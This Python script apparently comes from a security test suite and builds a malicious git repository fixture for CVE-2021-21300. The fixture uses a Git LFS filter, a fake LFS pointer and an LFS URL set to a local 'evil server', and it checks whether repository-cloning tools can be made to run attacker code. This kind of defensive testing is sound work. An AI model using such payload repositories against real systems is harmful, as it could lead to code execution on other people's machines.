"""F2: CVE-2021-21300 — Git LFS smudge + case-insensitive symlink.

A pillager whose docker image has ``git-lfs`` installed and runs
``git clone`` ends up invoking the LFS smudge filter, which on a
case-insensitive filesystem with the right collision can be tricked
into running an attacker-controlled script. Pillagers without
git-lfs or on case-sensitive filesystems PASS.
"""

from __future__ import annotations

import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
from _payload_lib import build_minimal_repo, config_with  # noqa: E402

GITATTRIBUTES = b"*.bin filter=lfs diff=lfs merge=lfs -text\n"

# A valid LFS pointer file format. The OID below is a fake SHA-256.
LFS_POINTER = (
    b"version https://git-lfs.github.com/spec/v1\n"
    b"oid sha256:" + b"a" * 64 + b"\n"
    b"size 1024\n"
)


def main() -> None:
    build_minimal_repo(
        HERE / "payload",
        # The LFS URL would normally come from .lfsconfig; we point it
        # at the evil server itself to maximize the chance that a
        # vulnerable client interacts with it.
        config=config_with(
            '[lfs]\n'
            '\turl = http://127.0.0.1:8080/lfs\n'
        ),
        tree_entries=[
            (0o100644, ".gitattributes", GITATTRIBUTES),
            (0o100644, "asset.bin", LFS_POINTER),
        ],
    )
    print(f"Built F2 payload at {HERE / 'payload'}")


if __name__ == "__main__":
    main()
